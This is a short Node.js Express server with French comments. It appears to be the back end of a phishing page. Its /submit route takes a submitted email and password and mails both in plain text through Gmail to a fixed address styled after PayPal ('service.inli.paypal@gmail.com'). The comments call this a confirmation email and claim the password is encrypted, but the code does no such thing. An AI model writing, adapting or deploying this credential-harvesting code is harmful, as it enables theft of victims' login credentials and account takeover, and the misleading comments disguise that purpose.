const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const app = express();

// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true })); // Pour les formulaires HTML classiques
app.use(express.json()); // Pour les requêtes JSON

// Route pour /login ou /submit (adaptée à ton cas)
app.post('/submit', async (req, res) => {
  const { email, password } = req.body;

  // Envoi d'un email de confirmation (exemple)
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER, // Variable d'environnement
      pass: process.env.GMAIL_APP_PASSWORD, // Mot de passe d'application
    },
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: 'service.inli.paypal@gmail.com', // Envoi à l'utilisateur OU à ton admin
    subject: 'Confirmation de connexion',
    text: `Votre email : ${email}\nMot de passe (crypté en prod!) : ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send("Données reçues ! Un email a été envoyé.");
  } catch (error) {
    console.error(error);
    res.status(500).send("Erreur lors de l'envoi.");
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log('Server running');
});
